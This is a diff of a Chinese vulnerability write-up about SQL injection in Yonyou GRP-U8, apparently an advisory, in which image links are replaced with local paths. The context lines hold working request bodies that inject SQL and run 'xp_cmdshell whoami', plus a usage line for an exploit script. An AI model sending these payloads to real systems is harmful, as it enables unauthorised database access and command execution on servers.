@@ -82,7 +82,7 @@ Content-Length: 386
 cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbgr0vic8FYm8C9QZdqicv9JyG0kPwQXNZZ4TgXr9GQ8icUmuNJ6YH4Zl9g/640?wx_fmt=png)
+![](../../.resource/remote/8d8af2eab8a6f47a9e48263f950f8df3b77015c282e14e46f39a435b5908a86c.png)
 
 (2): 执行 SQL 语句脚本
 
@@ -117,7 +117,7 @@ if__name__=="__main__":
 
 python3GRP-U8.py url
 
-![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rb3Zr0xnoclTbxhGQBEJv3WfFgoKiaIibic63n0vLdssqq7A8KyAEoAiahJg/640?wx_fmt=png)
+![](../../.resource/remote/f4ebadf146805b88b37b4b04e5553c70086d3ed3c61c2c62071c296067f142b0.png)
 
 (4): 执行命令 payload
 
@@ -137,7 +137,7 @@ Content-Length: 357
 cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">exec xp_cmdshell'whoami'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbONyrHibCbaWKhZTSGp4t5Bkg9libyIAATqxjd3zMb8R2sf9bHUspjkdA/640?wx_fmt=png)
+![](../../.resource/remote/8771458f21faa8f1e0de0d0e61dd550d524b05f3bf9418e0914a81e2fca7177a.png)
 
 (5): 执行命令脚本
 
@@ -172,7 +172,7 @@ if__name__=="__main__":
 
 python3GRP-U8.py url
 
-![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbuWunwTBgpWC5jsAcBAEFLtZQCRgqJhiar7nX4yVsIFz5tnLNrHzkAiag/640?wx_fmt=png)
+![](../../.resource/remote/ab3e2bda4fd2eddc47e6d577cda909814bbea61365a16062c8851bef690d94a7.png)
 
 #### 四、修复建议
 
